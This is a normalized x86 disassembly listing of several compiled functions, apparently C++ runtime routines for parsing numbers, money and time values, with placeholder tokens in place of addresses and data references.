mov eax sub_1004f47d
call sub_1002b30f
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100463e3
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_10007dbd
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_1002b392
retn 0x20
sub_10049639
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100470cf
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x18
sub_100496a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100470cf
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x18
sub_10049715
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100470cf
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
sub_10049786
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1003efd1
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100470cf
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
sub_100497f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x84 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ ebp - 0x88 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ ebp - 0x8 ]
mov edx ecx
and edx 0x3000
mov [ ebp - 0x80 ] ebx
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x84 ]
call sub_1003ef6a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10027b13
push eax
push edi
push ebx
push [ ebp - 0x80 ]
lea eax [ ebp - 0x78 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x88 ]
push [ ebp - 0x84 ]
call sub_10046c83
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x88 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ ebp - 0x79 ] bl
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_1004996a
mov edi edi
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ecx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x8c ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ ebp - 0x8 ]
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ ebp - 0x8 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
fld [ r--data ]
push ebx
fcom st1
push 0xa
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
pop ebx
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x88 ]
call sub_1003ef6a
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10027b13
push eax
push edi
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x8c ]
push [ ebp - 0x88 ]
call sub_10046c83
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8c ]
add esp 0x44
pop edi
xor ecx ebp
pop esi
call sub_10027150
leave
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ ebp - 0x84 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ ebp - 0x84 ] edx
jmp r-xdata
sub_10049ada
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_10027b13
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100470cf
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn 0x18
sub_10049b37
push 0x54
mov eax sub_1004f4b2
call sub_1002b30f
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x60 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x5c ] ebx
call sub_100472bb
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1004158d
add esp 0xc
lea ecx [ ebp - 0x48 ]
movzx ebx ax
call sub_100082a7
push [ ebp - 0x18 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10006c60
xor esi esi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1004256a
cmp [ eax ] bx
jb r-xdata
or [ edi ] 0x2
jmp r-xdata
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_100014aa
push esi
lea ecx [ ebp - 0x2c ]
call sub_1004256a
movzx eax [ eax ]
movzx ecx bx
add ecx 0x9
cmp ecx eax
jge r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10042e00
mov eax ebx
call sub_1002b392
retn 0x24
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x49 ] 0x30
sub [ ebp - 0x49 ] bl
cmp esi [ ebp - 0x18 ]
jae r-xdata
lea eax [ ebp - 0x50 ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x50 ] ebx
call sub_10022dec
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x44 ]
push esi
lea ecx [ ebp - 0x2c ]
call sub_1004256a
mov al [ eax ]
add al [ ebp - 0x49 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x58 ] al
push [ ebp - 0x58 ]
push 0x1
call sub_100014aa
inc esi
cmp esi [ ebp - 0x18 ]
jb r-xdata
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x50 ] ebx
jne r-xdata
mov eax [ ebp - 0x60 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov ebx [ ebp - 0x5c ]
sub_10049c89
push 0x20
mov eax sub_1004f4df
call sub_1002b30f
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_100472bb
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1004334b
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10042e00
mov eax edi
call sub_1002b392
retn 0x24
sub_10049d08
push 0x54
mov eax sub_1004f50c
call sub_1002b30f
fldz
xor ebx ebx
fcomp [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ebx
fld [ r--data ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jpe r-xdata
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] 0x1
fchs
fstp [ ebp + 0x20 ]
lea ecx [ ebp - 0x54 ]
fstp st0
call sub_100430dd
fld [ ebp + 0x20 ]
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_10027b13
add esp 0x14
xor esi esi
cmp eax ebx
mov [ ebp - 0x5c ] eax
jle r-xdata
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1004158d
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10043259
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_100439de
push [ ebp - 0x60 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10047b39
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10042e00
mov eax [ ebp + 0x8 ]
call sub_1002b392
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1004158d
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10043259
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
fld [ ebp + 0x20 ]
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fstp [ ebp + 0x20 ]
fld [ ebp + 0x20 ]
fcomp st1
fnstsw ax
test ah 0x1
je r-xdata
sub_10049e28
push 0x2c
mov eax sub_1004f539
call sub_1002b30f
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x34 ] edi
add edi 0x8
push edi
push 0x0
push 0x30
call sub_1004158d
add esp 0xc
cmp [ esi + 0x18 ] 0x8
movzx ebx ax
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
movzx eax [ esi ]
cmp bx ax
ja r-xdata
inc esi
mov [ ebp - 0x30 ] 0x1
inc esi
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x30 ] 0x0
call sub_1004158d
add esp 0xc
cmp [ esi ] ax
jne r-xdata
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10043963
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
movzx ecx bx
movzx eax ax
add ecx 0x9
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x38 ] esp
push eax
call sub_100439de
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10047b39
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042e00
mov eax [ ebp + 0x8 ]
call sub_1002b392
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10043259
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_10049efe
push 0x4
mov eax sub_1004ee15
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10048087
mov eax esi
call sub_1002b37e
retn 0x8
sub_10049f4d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10049f35
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10049f6e
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x28 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ebx
call sub_1004158d
add esp 0xc
push [ ebp - 0x28 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea edi [ ebp - 0x24 ]
call sub_10042bc0
test al al
jne r-xdata
push [ ebp - 0x28 ]
xor bl bl
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push 0x0
push 0x2b
call sub_1004158d
add esp 0xc
mov ecx esi
mov bx ax
call sub_10042d3e
cmp ax bx
jne r-xdata
push [ ebp - 0x28 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10042d3e
cmp ax [ ebp - 0x2c ]
jne r-xdata
push [ ebp - 0x34 ]
push 0x0
push 0x2d
call sub_1004158d
add esp 0xc
mov ecx esi
mov bx ax
call sub_10042d3e
cmp ax bx
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ecx esi
call sub_10042d3e
cmp [ ebp - 0x2c ] ax
ja r-xdata
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_10042ae0
push [ ebp - 0x28 ]
push esi
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x24 ] 0x2d
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10042ae0
mov ecx esi
call sub_10042d3e
movzx ecx [ ebp - 0x2c ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0xa
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x30 ] ebx
call sub_100229f4
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_10042bc0
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov ecx esi
call sub_10042d3e
mov cl 0x30
sub cl [ ebp - 0x2c ]
add al cl
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x3c ] eax
je r-xdata
inc ebx
mov ecx esi
mov bl 0x1
call sub_10042ae0
inc edi
or ebx 0x2
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
sub_1004a108
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x14 ]
push eax
push 0x0
push 0x3a
call sub_1004158d
mov ebx [ ebp + 0x24 ]
movzx eax ax
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x8 ]
push eax
push 0x17
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
mov esi [ ebp + 0x20 ]
add esp 0x24
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x4 ]
jne r-xdata
or [ esi ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x4 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042ae0
lea eax [ ebx + 0x4 ]
push eax
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042ae0
push ebx
push 0x3b
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1004a1cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_1004158d
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_1004158d
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_1004158d
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_1004158d
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_1004158d
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10042d3e
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042ae0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042ae0
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea eax [ ebx + 0x10 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
or [ esi ] eax
add esp 0x18
dec [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x18 ]
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004d1f2
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10049f6e
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10042f92
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
movzx ecx [ ebp - 0x8 ]
movzx eax ax
add ecx 0x9
cmp ecx eax
jl r-xdata
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042ae0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10042f92
pop ecx
pop ecx
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x10 ]
je r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0xc ]
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10042bc0
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10042ae0
lea ecx [ ebp + 0xc ]
call sub_10042d3e
cmp ax [ ebp - 0x14 ]
je r-xdata
